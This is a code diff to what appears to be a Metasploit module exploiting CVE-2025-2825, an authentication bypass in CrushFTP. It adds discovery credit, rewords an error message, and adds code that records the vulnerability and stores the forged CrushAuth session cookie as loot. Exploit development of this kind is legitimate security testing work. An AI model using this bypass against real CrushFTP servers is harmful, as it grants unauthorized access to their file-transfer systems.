@@ -19,7 +19,8 @@ class MetasploitModule < Msf::Auxiliary
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'remmons-r7', # MSF Module & Rapid7 Analysis
+          'Outpost24', # Initial Discovery
+          'remmons-r7' # MSF Module & Rapid7 Analysis
         ],
         'References' => [
           ['CVE', '2025-2825'],
@@ -50,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Confirming the target is a CrushFTP web service')
     res_anonymous = get_anon_session
 
-    fail_with(Failure::Unknown, 'Connection failed - unable to get 404 page response') unless res_anonymous
+    fail_with(Failure::Unknown, 'Connection failed - unable to get web API response') unless res_anonymous
 
     # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
     if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
@@ -80,7 +81,17 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unknown, 'Exploit failed - the target did not confirm authentication status')
     end
 
-    print_good("Authentication bypass succeeded! Cookie string generated\nCookie: CrushAuth=#{user_cookie}; currentAuth=#{user_cookie.to_s[-4..]}\n")
+    cookie_string = "Cookie: CrushAuth=#{user_cookie}; currentAuth=#{user_cookie.to_s[-4..]}"
+
+    print_good("Authentication bypass succeeded! Cookie string generated\n#{cookie_string}\n")
+
+    report_vuln(
+      host: rhost,
+      name: name,
+      refs: references
+    )
+
+    store_loot('CrushAuth', 'text/plain', datastore['RHOST'], cookie_string)
   end
 
   # A GET request to /WebInterface/ should return a 404 response that contains an 'anonymous' user cookie
